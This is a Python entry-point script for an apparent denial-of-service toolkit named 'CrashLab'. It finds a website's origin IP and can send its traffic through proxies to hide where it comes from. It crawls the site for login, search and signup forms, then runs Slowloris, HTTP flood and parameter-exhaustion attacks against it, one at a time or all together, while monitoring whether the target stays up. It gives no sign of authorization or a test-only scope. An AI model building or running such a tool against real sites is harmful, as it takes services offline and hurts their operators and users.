import yaml
import sys
import threading
from crashlab.target import Target
from crashlab.proxies import ProxyPool
from crashlab.crawler import Crawler
from crashlab.attacks.slowloris import Slowloris
from crashlab.attacks.http_flood import HTTPFlood
from crashlab.attacks.param_exhaust import ParamExhaust
from crashlab.reporter import monitor_target

def load_config(path="config.yaml"):
    with open(path) as f:
        return yaml.safe_load(f)

def main():
    cfg = load_config()
    base_url = cfg['target']['base_url']
    print(f"🚀 CrashLab targeting: {base_url}")

    # 1. Target setup
    target = Target(base_url)
    ip = target.resolve_origin_ip()
    print(f"   Origin IP: {ip}")

    # 2. Proxy pool
    proxies = None
    if cfg['proxies']['enabled']:
        proxies = ProxyPool(cfg['proxies']['proxy_list_file'])
        print("   Proxies enabled")

    # 3. Crawl to discover endpoints
    crawler = Crawler(target, proxy_pool=proxies,
                      delay=cfg['crawl']['delay'],
                      user_agent=cfg['crawl']['user_agent'])
    crawler.crawl(target.base_url, max_depth=cfg['crawl']['max_depth'])

    # 4. Compile attack target list
    all_interesting = crawler.login_forms + crawler.search_forms + crawler.signup_forms
    if crawler.dynamic_endpoints:
        # Treat dynamic endpoints as GET forms with query params as inputs
        for url in crawler.dynamic_endpoints:
            # simplistic: no real inputs, so param_exhaust will use invented ones
            all_interesting.append((url, 'GET', ['q']))  # generic search param

    if not all_interesting:
        print("No dynamic endpoints found. Falling back to HTTP flood on root.")
        all_interesting = [(base_url, 'GET', ['_'])]

    # 5. Start attacks (choose one or sequence)
    print("Select attack mode:")
    print("1. Slowloris only")
    print("2. HTTP flood only")
    print("3. Parameter exhaustion (targets discovered endpoints)")
    print("4. Combined (all at once)")
    choice = input("> ").strip()

    attacks = []
    if choice == '1':
        attacks.append(Slowloris(target, sockets=cfg['attacks']['slowloris']['sockets'],
                                 duration=cfg['attacks']['slowloris']['duration']))
    elif choice == '2':
        attacks.append(HTTPFlood(target, threads=cfg['attacks']['http_flood']['threads'],
                                 duration=cfg['attacks']['http_flood']['duration']))
    elif choice == '3':
        attacks.append(ParamExhaust(target, all_interesting,
                                    threads=cfg['attacks']['param_exhaust']['threads'],
                                    duration=cfg['attacks']['param_exhaust']['duration']))
    elif choice == '4':
        attacks.append(Slowloris(target, sockets=cfg['attacks']['slowloris']['sockets'],
                                 duration=cfg['attacks']['slowloris']['duration']))
        attacks.append(HTTPFlood(target, threads=cfg['attacks']['http_flood']['threads'],
                                 duration=cfg['attacks']['http_flood']['duration']))
        attacks.append(ParamExhaust(target, all_interesting,
                                    threads=cfg['attacks']['param_exhaust']['threads'],
                                    duration=cfg['attacks']['param_exhaust']['duration']))

    # 6. Start monitoring in a parallel thread
    monitor_thread = threading.Thread(target=monitor_target, args=(target,))
    monitor_thread.daemon = True
    monitor_thread.start()

    # 7. Launch attacks
    for attack in attacks:
        attack.start()    # blocks for duration
    print("All attacks finished. Press Ctrl+C to stop monitoring.")
    monitor_thread.join()

if __name__ == "__main__":
    main()
